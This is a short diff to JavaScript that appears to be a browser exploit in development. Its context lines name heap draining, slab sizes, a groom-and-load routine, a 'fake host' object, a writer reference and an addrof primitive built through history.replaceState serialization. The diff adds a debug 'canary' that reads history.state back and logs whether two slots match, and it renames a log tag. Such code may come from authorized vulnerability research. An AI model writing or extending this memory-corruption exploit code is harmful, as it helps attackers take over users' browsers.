@@ -54,6 +54,7 @@ const _g = (name, dflt) =>
   typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
 if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
 const HISTORY_LOAD_DELAY_MS = _g("histdelay", 0);
+const SSV_CANARY = _g("ssvcanary", 0);
 
 const DRAIN_SIZE = _g("drainsz", 0x10000);
 const SLAB_SIZE = _g("slab", 0x400000);
@@ -758,6 +759,16 @@ function buildAndStoreGraph() {
   emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
   history.replaceState(outerGraph, "");
   emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
+  if (SSV_CANARY > 0) {
+    try {
+      let canary = history.state;
+      const ok = canary && canary[1] === canary[2];
+      emit("SSV-CANARY-OK", `len=${canary ? canary.length : "null"}-match=${ok}`);
+      canary = null;
+    } catch (canaryErr) {
+      emit("SSV-CANARY-FAIL", `${canaryErr?.name}:${canaryErr?.message}`);
+    }
+  }
 }
 
 function prepareAddrof() {
@@ -1204,7 +1215,7 @@ function runGroomAndLoad() {
       finalHole,
     ]);
     if (HISTORY_LOAD_DELAY_MS > 0) {
-      emit("HISTORY-LOAD-DELAY", `ms=${HISTORY_LOAD_DELAY_MS}`);
+      emit("SSV-HISTORY-DELAY", `ms=${HISTORY_LOAD_DELAY_MS}`);
       setTimeout(finishHistoryLoad, HISTORY_LOAD_DELAY_MS);
       return;
     }
